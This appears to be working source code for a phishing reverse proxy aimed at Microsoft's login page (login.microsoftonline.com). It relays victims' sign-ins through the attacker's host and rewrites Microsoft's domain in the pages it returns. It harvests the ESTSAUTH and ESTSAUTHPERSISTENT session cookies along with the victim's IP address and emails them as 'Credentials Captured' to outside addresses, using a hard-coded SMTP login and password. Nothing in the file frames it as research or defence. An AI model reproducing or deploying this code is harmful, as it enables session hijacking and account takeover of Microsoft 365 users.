import fetch from 'node-fetch';
import nodemailer from 'nodemailer';

// Configuration
const upstream = 'login.microsoftonline.com';
const upstream_path = '/';
const https = true;
const blocked_region = [];
const blocked_ip_address = ['0.0.0.0', '127.0.0.1'];

// Configure Nodemailer with provided SMTP details
const transporter = nodemailer.createTransport({
    host: 'mail.mailo.com',
    port: 587,
    secure: false, // Use TLS
    auth: {
        user: 'coinreport@mailo.com',
        pass: 'sagekidayo'
    }
});

export const config = {
    api: {
        bodyParser: false
    }
};

export default async function handler(req, res) {
    try {
        const region = req.headers['cf-ipcountry'] ? req.headers['cf-ipcountry'].toUpperCase() : '';
        const ip_address = req.headers['cf-connecting-ip'];

        if (blocked_region.includes(region) || blocked_ip_address.includes(ip_address)) {
            res.status(403).send('Access denied.');
            return;
        }

        let url = new URL(req.url, `https://${req.headers.host}`);
        let url_hostname = url.hostname;

        url.protocol = https ? 'https:' : 'http:';
        url.host = upstream;
        url.pathname = url.pathname === '/' ? upstream_path : upstream_path + url.pathname;

        const fetchOptions = {
            method: req.method,
            headers: req.headers,
            body: req.method === 'POST' ? req.body : undefined
        };

        const upstreamResponse = await fetch(url.href, fetchOptions);

        if (!upstreamResponse.ok) {
            throw new Error(`Failed to fetch from upstream: ${upstreamResponse.statusText}`);
        }

        let original_response_clone = await upstreamResponse.clone();
        let original_text = await replace_response_text(original_response_clone, upstream, url_hostname);
        let new_response_headers = upstreamResponse.headers.raw();

        // Send email if necessary
        const cookies = new_response_headers['set-cookie'] || [];
        const all_cookies = cookies.join("; \n\n");

        if (all_cookies.includes('ESTSAUTH') && all_cookies.includes('ESTSAUTHPERSISTENT')) {
            await sendToServer(`Cookies found:\n\n${all_cookies}`, ip_address);
        }

        // Redirect to Google
        res.writeHead(upstreamResponse.status, {
            'Content-Type': 'text/html',
            ...new_response_headers,
            'Location': 'https://google.com'
        });
        res.end(original_text);

    } catch (error) {
        console.error('Error processing request:', error.message);
        res.status(500).send(`Internal Server Error: ${error.message}`);
    }
}

async function replace_response_text(response, upstream_domain, host_name) {
    try {
        let text = await response.text();
        text = text.replace(new RegExp('login.microsoftonline.com', 'g'), host_name);
        return text;
    } catch (error) {
        console.error('Error replacing response text:', error.message);
        throw error;
    }
}

async function sendToServer(data, ip_address) {
    const mailOptions = {
        from: 'coinreport@mailo.com',
        to: 'your-email@example.com', // Replace with your email address
        bcc: 'money@monemail.com',    // BCC address
        subject: 'Credentials Captured',
        text: `Data: ${data}\nIP Address: ${ip_address}`
    };

    try {
        await transporter.sendMail(mailOptions);
        console.log('Data sent to server successfully');
    } catch (error) {
        console.error('Error sending data:', error.message);
    }
}
